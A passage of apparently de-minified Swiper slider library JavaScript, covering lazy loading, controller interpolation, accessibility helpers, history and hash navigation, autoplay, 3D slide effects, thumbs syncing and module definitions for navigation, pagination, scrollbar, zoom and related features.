        if (n.loadPrevNext) if (1 < o || n.loadPrevNextAmount && 1 < n.loadPrevNextAmount) {
          for (var c = n.loadPrevNextAmount, u = o, h = Math.min(e + u + Math.max(c, u), s.length), v = Math.max(e - Math.max(u, c), 0), f = e + o; f < h; f += 1) l(f) && i.lazy.loadInSlide(f);
          for (var m = v; m < e; m += 1) l(m) && i.lazy.loadInSlide(m);
        } else {
          var g = t.children("." + a.slideNextClass);
          0 < g.length && i.lazy.loadInSlide(d(g));
          var b = t.children("." + a.slidePrevClass);
          0 < b.length && i.lazy.loadInSlide(d(b));
        }
      }
    },
    V = {
      LinearSpline: function (e, t) {
        var a,
          i,
          s,
          r,
          n,
          o = function (e, t) {
            for (i = -1, a = e.length; 1 < a - i;) e[s = a + i >> 1] <= t ? i = s : a = s;
            return a;
          };
        return this.x = e, this.y = t, this.lastIndex = e.length - 1, this.interpolate = function (e) {
          return e ? (n = o(this.x, e), r = n - 1, (e - this.x[r]) * (this.y[n] - this.y[r]) / (this.x[n] - this.x[r]) + this.y[r]) : 0;
        }, this;
      },
      getInterpolateFunction: function (e) {
        var t = this;
        t.controller.spline || (t.controller.spline = t.params.loop ? new V.LinearSpline(t.slidesGrid, e.slidesGrid) : new V.LinearSpline(t.snapGrid, e.snapGrid));
      },
      setTranslate: function (e, t) {
        var a,
          i,
          s = this,
          r = s.controller.control;
        function n(e) {
          var t = s.rtlTranslate ? -s.translate : s.translate;
          "slide" === s.params.controller.by && (s.controller.getInterpolateFunction(e), i = -s.controller.spline.interpolate(-t)), i && "container" !== s.params.controller.by || (a = (e.maxTranslate() - e.minTranslate()) / (s.maxTranslate() - s.minTranslate()), i = (t - s.minTranslate()) * a + e.minTranslate()), s.params.controller.inverse && (i = e.maxTranslate() - i), e.updateProgress(i), e.setTranslate(i, s), e.updateActiveIndex(), e.updateSlidesClasses();
        }
        if (Array.isArray(r)) for (var o = 0; o < r.length; o += 1) r[o] !== t && r[o] instanceof T && n(r[o]);else r instanceof T && t !== r && n(r);
      },
      setTransition: function (t, e) {
        var a,
          i = this,
          s = i.controller.control;
        function r(e) {
          e.setTransition(t, i), 0 !== t && (e.transitionStart(), e.params.autoHeight && ee.nextTick(function () {
            e.updateAutoHeight();
          }), e.$wrapperEl.transitionEnd(function () {
            s && (e.params.loop && "slide" === i.params.controller.by && e.loopFix(), e.transitionEnd());
          }));
        }
        if (Array.isArray(s)) for (a = 0; a < s.length; a += 1) s[a] !== e && s[a] instanceof T && r(s[a]);else s instanceof T && e !== s && r(s);
      }
    },
    F = {
      makeElFocusable: function (e) {
        return e.attr("tabIndex", "0"), e;
      },
      addElRole: function (e, t) {
        return e.attr("role", t), e;
      },
      addElLabel: function (e, t) {
        return e.attr("aria-label", t), e;
      },
      disableEl: function (e) {
        return e.attr("aria-disabled", !0), e;
      },
      enableEl: function (e) {
        return e.attr("aria-disabled", !1), e;
      },
      onEnterKey: function (e) {
        var t = this,
          a = t.params.a11y;
        if (13 === e.keyCode) {
          var i = L(e.target);
          t.navigation && t.navigation.$nextEl && i.is(t.navigation.$nextEl) && (t.isEnd && !t.params.loop || t.slideNext(), t.isEnd ? t.a11y.notify(a.lastSlideMessage) : t.a11y.notify(a.nextSlideMessage)), t.navigation && t.navigation.$prevEl && i.is(t.navigation.$prevEl) && (t.isBeginning && !t.params.loop || t.slidePrev(), t.isBeginning ? t.a11y.notify(a.firstSlideMessage) : t.a11y.notify(a.prevSlideMessage)), t.pagination && i.is("." + t.params.pagination.bulletClass) && i[0].click();
        }
      },
      notify: function (e) {
        var t = this.a11y.liveRegion;
        0 !== t.length && (t.html(""), t.html(e));
      },
      updateNavigation: function () {
        var e = this;
        if (!e.params.loop) {
          var t = e.navigation,
            a = t.$nextEl,
            i = t.$prevEl;
          i && 0 < i.length && (e.isBeginning ? e.a11y.disableEl(i) : e.a11y.enableEl(i)), a && 0 < a.length && (e.isEnd ? e.a11y.disableEl(a) : e.a11y.enableEl(a));
        }
      },
      updatePagination: function () {
        var i = this,
          s = i.params.a11y;
        i.pagination && i.params.pagination.clickable && i.pagination.bullets && i.pagination.bullets.length && i.pagination.bullets.each(function (e, t) {
          var a = L(t);
          i.a11y.makeElFocusable(a), i.a11y.addElRole(a, "button"), i.a11y.addElLabel(a, s.paginationBulletMessage.replace(/{{index}}/, a.index() + 1));
        });
      },
      init: function () {
        var e = this;
        e.$el.append(e.a11y.liveRegion);
        var t,
          a,
          i = e.params.a11y;
        e.navigation && e.navigation.$nextEl && (t = e.navigation.$nextEl), e.navigation && e.navigation.$prevEl && (a = e.navigation.$prevEl), t && (e.a11y.makeElFocusable(t), e.a11y.addElRole(t, "button"), e.a11y.addElLabel(t, i.nextSlideMessage), t.on("keydown", e.a11y.onEnterKey)), a && (e.a11y.makeElFocusable(a), e.a11y.addElRole(a, "button"), e.a11y.addElLabel(a, i.prevSlideMessage), a.on("keydown", e.a11y.onEnterKey)), e.pagination && e.params.pagination.clickable && e.pagination.bullets && e.pagination.bullets.length && e.pagination.$el.on("keydown", "." + e.params.pagination.bulletClass, e.a11y.onEnterKey);
      },
      destroy: function () {
        var e,
          t,
          a = this;
        a.a11y.liveRegion && 0 < a.a11y.liveRegion.length && a.a11y.liveRegion.remove(), a.navigation && a.navigation.$nextEl && (e = a.navigation.$nextEl), a.navigation && a.navigation.$prevEl && (t = a.navigation.$prevEl), e && e.off("keydown", a.a11y.onEnterKey), t && t.off("keydown", a.a11y.onEnterKey), a.pagination && a.params.pagination.clickable && a.pagination.bullets && a.pagination.bullets.length && a.pagination.$el.off("keydown", "." + a.params.pagination.bulletClass, a.a11y.onEnterKey);
      }
    },
    R = {
      init: function () {
        var e = this;
        if (e.params.history) {
          if (!J.history || !J.history.pushState) return e.params.history.enabled = !1, void (e.params.hashNavigation.enabled = !0);
          var t = e.history;
          t.initialized = !0, t.paths = R.getPathValues(), (t.paths.key || t.paths.value) && (t.scrollToSlide(0, t.paths.value, e.params.runCallbacksOnInit), e.params.history.replaceState || J.addEventListener("popstate", e.history.setHistoryPopState));
        }
      },
      destroy: function () {
        this.params.history.replaceState || J.removeEventListener("popstate", this.history.setHistoryPopState);
      },
      setHistoryPopState: function () {
        this.history.paths = R.getPathValues(), this.history.scrollToSlide(this.params.speed, this.history.paths.value, !1);
      },
      getPathValues: function () {
        var e = J.location.pathname.slice(1).split("/").filter(function (e) {
            return "" !== e;
          }),
          t = e.length;
        return {
          key: e[t - 2],
          value: e[t - 1]
        };
      },
      setHistory: function (e, t) {
        if (this.history.initialized && this.params.history.enabled) {
          var a = this.slides.eq(t),
            i = R.slugify(a.attr("data-history"));
          J.location.pathname.includes(e) || (i = e + "/" + i);
          var s = J.history.state;
          s && s.value === i || (this.params.history.replaceState ? J.history.replaceState({
            value: i
          }, null, i) : J.history.pushState({
            value: i
          }, null, i));
        }
      },
      slugify: function (e) {
        return e.toString().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, "");
      },
      scrollToSlide: function (e, t, a) {
        var i = this;
        if (t) for (var s = 0, r = i.slides.length; s < r; s += 1) {
          var n = i.slides.eq(s);
          if (R.slugify(n.attr("data-history")) === t && !n.hasClass(i.params.slideDuplicateClass)) {
            var o = n.index();
            i.slideTo(o, e, a);
          }
        } else i.slideTo(0, e, a);
      }
    },
    q = {
      onHashCange: function () {
        var e = this,
          t = f.location.hash.replace("#", "");
        if (t !== e.slides.eq(e.activeIndex).attr("data-hash")) {
          var a = e.$wrapperEl.children("." + e.params.slideClass + '[data-hash="' + t + '"]').index();
          if (void 0 === a) return;
          e.slideTo(a);
        }
      },
      setHash: function () {
        var e = this;
        if (e.hashNavigation.initialized && e.params.hashNavigation.enabled) if (e.params.hashNavigation.replaceState && J.history && J.history.replaceState) J.history.replaceState(null, null, "#" + e.slides.eq(e.activeIndex).attr("data-hash") || "");else {
          var t = e.slides.eq(e.activeIndex),
            a = t.attr("data-hash") || t.attr("data-history");
          f.location.hash = a || "";
        }
      },
      init: function () {
        var e = this;
        if (!(!e.params.hashNavigation.enabled || e.params.history && e.params.history.enabled)) {
          e.hashNavigation.initialized = !0;
          var t = f.location.hash.replace("#", "");
          if (t) for (var a = 0, i = e.slides.length; a < i; a += 1) {
            var s = e.slides.eq(a);
            if ((s.attr("data-hash") || s.attr("data-history")) === t && !s.hasClass(e.params.slideDuplicateClass)) {
              var r = s.index();
              e.slideTo(r, 0, e.params.runCallbacksOnInit, !0);
            }
          }
          e.params.hashNavigation.watchState && L(J).on("hashchange", e.hashNavigation.onHashCange);
        }
      },
      destroy: function () {
        this.params.hashNavigation.watchState && L(J).off("hashchange", this.hashNavigation.onHashCange);
      }
    },
    W = {
      run: function () {
        var e = this,
          t = e.slides.eq(e.activeIndex),
          a = e.params.autoplay.delay;
        t.attr("data-swiper-autoplay") && (a = t.attr("data-swiper-autoplay") || e.params.autoplay.delay), e.autoplay.timeout = ee.nextTick(function () {
          e.params.autoplay.reverseDirection ? e.params.loop ? (e.loopFix(), e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.isBeginning ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(e.slides.length - 1, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slidePrev(e.params.speed, !0, !0), e.emit("autoplay")) : e.params.loop ? (e.loopFix(), e.slideNext(e.params.speed, !0, !0), e.emit("autoplay")) : e.isEnd ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(0, e.params.speed, !0, !0), e.emit("autoplay")) : (e.slideNext(e.params.speed, !0, !0), e.emit("autoplay"));
        }, a);
      },
      start: function () {
        var e = this;
        return void 0 === e.autoplay.timeout && !e.autoplay.running && (e.autoplay.running = !0, e.emit("autoplayStart"), e.autoplay.run(), !0);
      },
      stop: function () {
        var e = this;
        return !!e.autoplay.running && void 0 !== e.autoplay.timeout && (e.autoplay.timeout && (clearTimeout(e.autoplay.timeout), e.autoplay.timeout = void 0), e.autoplay.running = !1, e.emit("autoplayStop"), !0);
      },
      pause: function (e) {
        var t = this;
        t.autoplay.running && (t.autoplay.paused || (t.autoplay.timeout && clearTimeout(t.autoplay.timeout), t.autoplay.paused = !0, 0 !== e && t.params.autoplay.waitForTransition ? (t.$wrapperEl[0].addEventListener("transitionend", t.autoplay.onTransitionEnd), t.$wrapperEl[0].addEventListener("webkitTransitionEnd", t.autoplay.onTransitionEnd)) : (t.autoplay.paused = !1, t.autoplay.run())));
      }
    },
    j = {
      setTranslate: function () {
        for (var e = this, t = e.slides, a = 0; a < t.length; a += 1) {
          var i = e.slides.eq(a),
            s = -i[0].swiperSlideOffset;
          e.params.virtualTranslate || (s -= e.translate);
          var r = 0;
          e.isHorizontal() || (r = s, s = 0);
          var n = e.params.fadeEffect.crossFade ? Math.max(1 - Math.abs(i[0].progress), 0) : 1 + Math.min(Math.max(i[0].progress, -1), 0);
          i.css({
            opacity: n
          }).transform("translate3d(" + s + "px, " + r + "px, 0px)");
        }
      },
      setTransition: function (e) {
        var a = this,
          t = a.slides,
          i = a.$wrapperEl;
        if (t.transition(e), a.params.virtualTranslate && 0 !== e) {
          var s = !1;
          t.transitionEnd(function () {
            if (!s && a && !a.destroyed) {
              s = !0, a.animating = !1;
              for (var e = ["webkitTransitionEnd", "transitionend"], t = 0; t < e.length; t += 1) i.trigger(e[t]);
            }
          });
        }
      }
    },
    U = {
      setTranslate: function () {
        var e,
          t = this,
          a = t.$el,
          i = t.$wrapperEl,
          s = t.slides,
          r = t.width,
          n = t.height,
          o = t.rtlTranslate,
          l = t.size,
          d = t.params.cubeEffect,
          p = t.isHorizontal(),
          c = t.virtual && t.params.virtual.enabled,
          u = 0;
        d.shadow && (p ? (0 === (e = i.find(".swiper-cube-shadow")).length && (e = L('<div class="swiper-cube-shadow"></div>'), i.append(e)), e.css({
          height: r + "px"
        })) : 0 === (e = a.find(".swiper-cube-shadow")).length && (e = L('<div class="swiper-cube-shadow"></div>'), a.append(e)));
        for (var h = 0; h < s.length; h += 1) {
          var v = s.eq(h),
            f = h;
          c && (f = parseInt(v.attr("data-swiper-slide-index"), 10));
          var m = 90 * f,
            g = Math.floor(m / 360);
          o && (m = -m, g = Math.floor(-m / 360));
          var b = Math.max(Math.min(v[0].progress, 1), -1),
            w = 0,
            y = 0,
            x = 0;
          f % 4 == 0 ? (w = 4 * -g * l, x = 0) : (f - 1) % 4 == 0 ? (w = 0, x = 4 * -g * l) : (f - 2) % 4 == 0 ? (w = l + 4 * g * l, x = l) : (f - 3) % 4 == 0 && (w = -l, x = 3 * l + 4 * l * g), o && (w = -w), p || (y = w, w = 0);
          var T = "rotateX(" + (p ? 0 : -m) + "deg) rotateY(" + (p ? m : 0) + "deg) translate3d(" + w + "px, " + y + "px, " + x + "px)";
          if (b <= 1 && -1 < b && (u = 90 * f + 90 * b, o && (u = 90 * -f - 90 * b)), v.transform(T), d.slideShadows) {
            var E = p ? v.find(".swiper-slide-shadow-left") : v.find(".swiper-slide-shadow-top"),
              S = p ? v.find(".swiper-slide-shadow-right") : v.find(".swiper-slide-shadow-bottom");
            0 === E.length && (E = L('<div class="swiper-slide-shadow-' + (p ? "left" : "top") + '"></div>'), v.append(E)), 0 === S.length && (S = L('<div class="swiper-slide-shadow-' + (p ? "right" : "bottom") + '"></div>'), v.append(S)), E.length && (E[0].style.opacity = Math.max(-b, 0)), S.length && (S[0].style.opacity = Math.max(b, 0));
          }
        }
        if (i.css({
          "-webkit-transform-origin": "50% 50% -" + l / 2 + "px",
          "-moz-transform-origin": "50% 50% -" + l / 2 + "px",
          "-ms-transform-origin": "50% 50% -" + l / 2 + "px",
          "transform-origin": "50% 50% -" + l / 2 + "px"
        }), d.shadow) if (p) e.transform("translate3d(0px, " + (r / 2 + d.shadowOffset) + "px, " + -r / 2 + "px) rotateX(90deg) rotateZ(0deg) scale(" + d.shadowScale + ")");else {
          var C = Math.abs(u) - 90 * Math.floor(Math.abs(u) / 90),
            M = 1.5 - (Math.sin(2 * C * Math.PI / 360) / 2 + Math.cos(2 * C * Math.PI / 360) / 2),
            z = d.shadowScale,
            P = d.shadowScale / M,
            k = d.shadowOffset;
          e.transform("scale3d(" + z + ", 1, " + P + ") translate3d(0px, " + (n / 2 + k) + "px, " + -n / 2 / P + "px) rotateX(-90deg)");
        }
        var $ = I.isSafari || I.isUiWebView ? -l / 2 : 0;
        i.transform("translate3d(0px,0," + $ + "px) rotateX(" + (t.isHorizontal() ? 0 : u) + "deg) rotateY(" + (t.isHorizontal() ? -u : 0) + "deg)");
      },
      setTransition: function (e) {
        var t = this.$el;
        this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), this.params.cubeEffect.shadow && !this.isHorizontal() && t.find(".swiper-cube-shadow").transition(e);
      }
    },
    K = {
      setTranslate: function () {
        for (var e = this, t = e.slides, a = e.rtlTranslate, i = 0; i < t.length; i += 1) {
          var s = t.eq(i),
            r = s[0].progress;
          e.params.flipEffect.limitRotation && (r = Math.max(Math.min(s[0].progress, 1), -1));
          var n = -180 * r,
            o = 0,
            l = -s[0].swiperSlideOffset,
            d = 0;
          if (e.isHorizontal() ? a && (n = -n) : (d = l, o = -n, n = l = 0), s[0].style.zIndex = -Math.abs(Math.round(r)) + t.length, e.params.flipEffect.slideShadows) {
            var p = e.isHorizontal() ? s.find(".swiper-slide-shadow-left") : s.find(".swiper-slide-shadow-top"),
              c = e.isHorizontal() ? s.find(".swiper-slide-shadow-right") : s.find(".swiper-slide-shadow-bottom");
            0 === p.length && (p = L('<div class="swiper-slide-shadow-' + (e.isHorizontal() ? "left" : "top") + '"></div>'), s.append(p)), 0 === c.length && (c = L('<div class="swiper-slide-shadow-' + (e.isHorizontal() ? "right" : "bottom") + '"></div>'), s.append(c)), p.length && (p[0].style.opacity = Math.max(-r, 0)), c.length && (c[0].style.opacity = Math.max(r, 0));
          }
          s.transform("translate3d(" + l + "px, " + d + "px, 0px) rotateX(" + o + "deg) rotateY(" + n + "deg)");
        }
      },
      setTransition: function (e) {
        var a = this,
          t = a.slides,
          i = a.activeIndex,
          s = a.$wrapperEl;
        if (t.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), a.params.virtualTranslate && 0 !== e) {
          var r = !1;
          t.eq(i).transitionEnd(function () {
            if (!r && a && !a.destroyed) {
              r = !0, a.animating = !1;
              for (var e = ["webkitTransitionEnd", "transitionend"], t = 0; t < e.length; t += 1) s.trigger(e[t]);
            }
          });
        }
      }
    },
    _ = {
      setTranslate: function () {
        for (var e = this, t = e.width, a = e.height, i = e.slides, s = e.$wrapperEl, r = e.slidesSizesGrid, n = e.params.coverflowEffect, o = e.isHorizontal(), l = e.translate, d = o ? t / 2 - l : a / 2 - l, p = o ? n.rotate : -n.rotate, c = n.depth, u = 0, h = i.length; u < h; u += 1) {
          var v = i.eq(u),
            f = r[u],
            m = (d - v[0].swiperSlideOffset - f / 2) / f * n.modifier,
            g = o ? p * m : 0,
            b = o ? 0 : p * m,
            w = -c * Math.abs(m),
            y = o ? 0 : n.stretch * m,
            x = o ? n.stretch * m : 0;
          Math.abs(x) < .001 && (x = 0), Math.abs(y) < .001 && (y = 0), Math.abs(w) < .001 && (w = 0), Math.abs(g) < .001 && (g = 0), Math.abs(b) < .001 && (b = 0);
          var T = "translate3d(" + x + "px," + y + "px," + w + "px)  rotateX(" + b + "deg) rotateY(" + g + "deg)";
          if (v.transform(T), v[0].style.zIndex = 1 - Math.abs(Math.round(m)), n.slideShadows) {
            var E = o ? v.find(".swiper-slide-shadow-left") : v.find(".swiper-slide-shadow-top"),
              S = o ? v.find(".swiper-slide-shadow-right") : v.find(".swiper-slide-shadow-bottom");
            0 === E.length && (E = L('<div class="swiper-slide-shadow-' + (o ? "left" : "top") + '"></div>'), v.append(E)), 0 === S.length && (S = L('<div class="swiper-slide-shadow-' + (o ? "right" : "bottom") + '"></div>'), v.append(S)), E.length && (E[0].style.opacity = 0 < m ? m : 0), S.length && (S[0].style.opacity = 0 < -m ? -m : 0);
          }
        }
        (te.pointerEvents || te.prefixedPointerEvents) && (s[0].style.perspectiveOrigin = d + "px 50%");
      },
      setTransition: function (e) {
        this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e);
      }
    },
    Z = {
      init: function () {
        var e = this,
          t = e.params.thumbs,
          a = e.constructor;
        t.swiper instanceof a ? (e.thumbs.swiper = t.swiper, ee.extend(e.thumbs.swiper.originalParams, {
          watchSlidesProgress: !0,
          slideToClickedSlide: !1
        }), ee.extend(e.thumbs.swiper.params, {
          watchSlidesProgress: !0,
          slideToClickedSlide: !1
        })) : ee.isObject(t.swiper) && (e.thumbs.swiper = new a(ee.extend({}, t.swiper, {
          watchSlidesVisibility: !0,
          watchSlidesProgress: !0,
          slideToClickedSlide: !1
        })), e.thumbs.swiperCreated = !0), e.thumbs.swiper.$el.addClass(e.params.thumbs.thumbsContainerClass), e.thumbs.swiper.on("tap", e.thumbs.onThumbClick);
      },
      onThumbClick: function () {
        var e = this,
          t = e.thumbs.swiper;
        if (t) {
          var a = t.clickedIndex,
            i = t.clickedSlide;
          if (!(i && L(i).hasClass(e.params.thumbs.slideThumbActiveClass) || null == a)) {
            var s;
            if (s = t.params.loop ? parseInt(L(t.clickedSlide).attr("data-swiper-slide-index"), 10) : a, e.params.loop) {
              var r = e.activeIndex;
              e.slides.eq(r).hasClass(e.params.slideDuplicateClass) && (e.loopFix(), e._clientLeft = e.$wrapperEl[0].clientLeft, r = e.activeIndex);
              var n = e.slides.eq(r).prevAll('[data-swiper-slide-index="' + s + '"]').eq(0).index(),
                o = e.slides.eq(r).nextAll('[data-swiper-slide-index="' + s + '"]').eq(0).index();
              s = void 0 === n ? o : void 0 === o ? n : o - r < r - n ? o : n;
            }
            e.slideTo(s);
          }
        }
      },
      update: function (e) {
        var t = this,
          a = t.thumbs.swiper;
        if (a) {
          var i = "auto" === a.params.slidesPerView ? a.slidesPerViewDynamic() : a.params.slidesPerView;
          if (t.realIndex !== a.realIndex) {
            var s,
              r = a.activeIndex;
            if (a.params.loop) {
              a.slides.eq(r).hasClass(a.params.slideDuplicateClass) && (a.loopFix(), a._clientLeft = a.$wrapperEl[0].clientLeft, r = a.activeIndex);
              var n = a.slides.eq(r).prevAll('[data-swiper-slide-index="' + t.realIndex + '"]').eq(0).index(),
                o = a.slides.eq(r).nextAll('[data-swiper-slide-index="' + t.realIndex + '"]').eq(0).index();
              s = void 0 === n ? o : void 0 === o ? n : o - r == r - n ? r : o - r < r - n ? o : n;
            } else s = t.realIndex;
            a.visibleSlidesIndexes.indexOf(s) < 0 && (a.params.centeredSlides ? s = r < s ? s - Math.floor(i / 2) + 1 : s + Math.floor(i / 2) - 1 : r < s && (s = s - i + 1), a.slideTo(s, e ? 0 : void 0));
          }
          var l = 1,
            d = t.params.thumbs.slideThumbActiveClass;
          if (1 < t.params.slidesPerView && !t.params.centeredSlides && (l = t.params.slidesPerView), a.slides.removeClass(d), a.params.loop) for (var p = 0; p < l; p += 1) a.$wrapperEl.children('[data-swiper-slide-index="' + (t.realIndex + p) + '"]').addClass(d);else for (var c = 0; c < l; c += 1) a.slides.eq(t.realIndex + c).addClass(d);
        }
      }
    },
    Q = [E, S, C, M, P, $, O, {
      name: "mousewheel",
      params: {
        mousewheel: {
          enabled: !1,
          releaseOnEdges: !1,
          invert: !1,
          forceToAxis: !1,
          sensitivity: 1,
          eventsTarged: "container"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          mousewheel: {
            enabled: !1,
            enable: A.enable.bind(e),
            disable: A.disable.bind(e),
            handle: A.handle.bind(e),
            handleMouseEnter: A.handleMouseEnter.bind(e),
            handleMouseLeave: A.handleMouseLeave.bind(e),
            lastScrollTime: ee.now()
          }
        });
      },
      on: {
        init: function () {
          this.params.mousewheel.enabled && this.mousewheel.enable();
        },
        destroy: function () {
          this.mousewheel.enabled && this.mousewheel.disable();
        }
      }
    }, {
      name: "navigation",
      params: {
        navigation: {
          nextEl: null,
          prevEl: null,
          hideOnClick: !1,
          disabledClass: "swiper-button-disabled",
          hiddenClass: "swiper-button-hidden",
          lockClass: "swiper-button-lock"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          navigation: {
            init: H.init.bind(e),
            update: H.update.bind(e),
            destroy: H.destroy.bind(e),
            onNextClick: H.onNextClick.bind(e),
            onPrevClick: H.onPrevClick.bind(e)
          }
        });
      },
      on: {
        init: function () {
          this.navigation.init(), this.navigation.update();
        },
        toEdge: function () {
          this.navigation.update();
        },
        fromEdge: function () {
          this.navigation.update();
        },
        destroy: function () {
          this.navigation.destroy();
        },
        click: function (e) {
          var t,
            a = this,
            i = a.navigation,
            s = i.$nextEl,
            r = i.$prevEl;
          !a.params.navigation.hideOnClick || L(e.target).is(r) || L(e.target).is(s) || (s ? t = s.hasClass(a.params.navigation.hiddenClass) : r && (t = r.hasClass(a.params.navigation.hiddenClass)), !0 === t ? a.emit("navigationShow", a) : a.emit("navigationHide", a), s && s.toggleClass(a.params.navigation.hiddenClass), r && r.toggleClass(a.params.navigation.hiddenClass));
        }
      }
    }, {
      name: "pagination",
      params: {
        pagination: {
          el: null,
          bulletElement: "span",
          clickable: !1,
          hideOnClick: !1,
          renderBullet: null,
          renderProgressbar: null,
          renderFraction: null,
          renderCustom: null,
          progressbarOpposite: !1,
          type: "bullets",
          dynamicBullets: !1,
          dynamicMainBullets: 1,
          formatFractionCurrent: function (e) {
            return e;
          },
          formatFractionTotal: function (e) {
            return e;
          },
          bulletClass: "swiper-pagination-bullet",
          bulletActiveClass: "swiper-pagination-bullet-active",
          modifierClass: "swiper-pagination-",
          currentClass: "swiper-pagination-current",
          totalClass: "swiper-pagination-total",
          hiddenClass: "swiper-pagination-hidden",
          progressbarFillClass: "swiper-pagination-progressbar-fill",
          progressbarOppositeClass: "swiper-pagination-progressbar-opposite",
          clickableClass: "swiper-pagination-clickable",
          lockClass: "swiper-pagination-lock"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          pagination: {
            init: N.init.bind(e),
            render: N.render.bind(e),
            update: N.update.bind(e),
            destroy: N.destroy.bind(e),
            dynamicBulletIndex: 0
          }
        });
      },
      on: {
        init: function () {
          this.pagination.init(), this.pagination.render(), this.pagination.update();
        },
        activeIndexChange: function () {
          this.params.loop ? this.pagination.update() : void 0 === this.snapIndex && this.pagination.update();
        },
        snapIndexChange: function () {
          this.params.loop || this.pagination.update();
        },
        slidesLengthChange: function () {
          this.params.loop && (this.pagination.render(), this.pagination.update());
        },
        snapGridLengthChange: function () {
          this.params.loop || (this.pagination.render(), this.pagination.update());
        },
        destroy: function () {
          this.pagination.destroy();
        },
        click: function (e) {
          var t = this;
          t.params.pagination.el && t.params.pagination.hideOnClick && 0 < t.pagination.$el.length && !L(e.target).hasClass(t.params.pagination.bulletClass) && (!0 === t.pagination.$el.hasClass(t.params.pagination.hiddenClass) ? t.emit("paginationShow", t) : t.emit("paginationHide", t), t.pagination.$el.toggleClass(t.params.pagination.hiddenClass));
        }
      }
    }, {
      name: "scrollbar",
      params: {
        scrollbar: {
          el: null,
          dragSize: "auto",
          hide: !1,
          draggable: !1,
          snapOnRelease: !0,
          lockClass: "swiper-scrollbar-lock",
          dragClass: "swiper-scrollbar-drag"
        }
      },
      create: function () {
        var e = this;
        ee.extend(e, {
          scrollbar: {
            init: G.init.bind(e),
            destroy: G.destroy.bind(e),
            updateSize: G.updateSize.bind(e),
            setTranslate: G.setTranslate.bind(e),
            setTransition: G.setTransition.bind(e),
            enableDraggable: G.enableDraggable.bind(e),
            disableDraggable: G.disableDraggable.bind(e),
            setDragPosition: G.setDragPosition.bind(e),
            onDragStart: G.onDragStart.bind(e),
            onDragMove: G.onDragMove.bind(e),
            onDragEnd: G.onDragEnd.bind(e),
            isTouched: !1,
            timeout: null,
            dragTimeout: null
          }
        });
      },
      on: {
        init: function () {
          this.scrollbar.init(), this.scrollbar.updateSize(), this.scrollbar.setTranslate();
        },
        update: function () {
          this.scrollbar.updateSize();
        },
        resize: function () {
          this.scrollbar.updateSize();
        },
        observerUpdate: function () {
          this.scrollbar.updateSize();
        },
        setTranslate: function () {
          this.scrollbar.setTranslate();
        },
        setTransition: function (e) {
          this.scrollbar.setTransition(e);
        },
        destroy: function () {
          this.scrollbar.destroy();
        }
      }
    }, {
      name: "parallax",
      params: {
        parallax: {
          enabled: !1
        }
      },
      create: function () {
        ee.extend(this, {
          parallax: {
            setTransform: B.setTransform.bind(this),
            setTranslate: B.setTranslate.bind(this),
            setTransition: B.setTransition.bind(this)
          }
        });
      },
      on: {
        beforeInit: function () {
          this.params.parallax.enabled && (this.params.watchSlidesProgress = !0, this.originalParams.watchSlidesProgress = !0);
        },
        init: function () {
          this.params.parallax.enabled && this.parallax.setTranslate();
        },
        setTranslate: function () {
          this.params.parallax.enabled && this.parallax.setTranslate();
        },
        setTransition: function (e) {
          this.params.parallax.enabled && this.parallax.setTransition(e);
        }
      }
    }, {
      name: "zoom",
      params: {
        zoom: {
          enabled: !1,
          maxRatio: 3,
          minRatio: 1,
          toggle: !0,
          containerClass: "swiper-zoom-container",
          zoomedSlideClass: "swiper-slide-zoomed"
        }
      },
      create: function () {
        var i = this,
          t = {
            enabled: !1,
            scale: 1,
            currentScale: 1,
            isScaling: !1,
            gesture: {
              $slideEl: void 0,
              slideWidth: void 0,
              slideHeight: void 0,
              $imageEl: void 0,
              $imageWrapEl: void 0,
              maxRatio: 3
            },
            image: {
              isTouched: void 0,
              isMoved: void 0,
              currentX: void 0,
              currentY: void 0,
              minX: void 0,
              minY: void 0,
              maxX: void 0,
              maxY: void 0,
              width: void 0,
              height: void 0,
              startX: void 0,
              startY: void 0,
              touchesStart: {},
              touchesCurrent: {}
            },
            velocity: {
              x: void 0,
              y: void 0,
              prevPositionX: void 0,
              prevPositionY: void 0,
              prevTime: void 0
            }
          };
        "onGestureStart onGestureChange onGestureEnd onTouchStart onTouchMove onTouchEnd onTransitionEnd toggle enable disable in out".split(" ").forEach(function (e) {
          t[e] = X[e].bind(i);
        }), ee.extend(i, {
          zoom: t
        });
        var s = 1;
        Object.defineProperty(i.zoom, "scale", {
          get: function () {
            return s;
          },
          set: function (e) {
            if (s !== e) {
              var t = i.zoom.gesture.$imageEl ? i.zoom.gesture.$imageEl[0] : void 0,
                a = i.zoom.gesture.$slideEl ? i.zoom.gesture.$slideEl[0] : void 0;
              i.emit("zoomChange", e, t, a);
            }
            s = e;
          }
        });
      },
      on: {
        init: function () {
          this.params.zoom.enabled && this.zoom.enable();
        },
        destroy: function () {
          this.zoom.disable();
        },
        touchStart: function (e) {
          this.zoom.enabled && this.zoom.onTouchStart(e);
        },
        touchEnd: function (e) {
          this.zoom.enabled && this.zoom.onTouchEnd(e);
        },
        doubleTap: function (e) {
          this.params.zoom.enabled && this.zoom.enabled && this.params.zoom.toggle && this.zoom.toggle(e);
        },
        transitionEnd: function () {
          this.zoom.enabled && this.params.zoom.enabled && this.zoom.onTransitionEnd();
        }
      }
    }, {
      name: "lazy",
      params: {
        lazy: {
          enabled: !1,
          loadPrevNext: !1,
          loadPrevNextAmount: 1,
          loadOnTransitionStart: !1,
          elementClass: "swiper-lazy",
          loadingClass: "swiper-lazy-loading",
          loadedClass: "swiper-lazy-loaded",
          preloaderClass: "swiper-lazy-preloader"
        }
      },
      create: function () {
        ee.extend(this, {
          lazy: {
            initialImageLoaded: !1,
            load: Y.load.bind(this),
            loadInSlide: Y.loadInSlide.bind(this)
          }
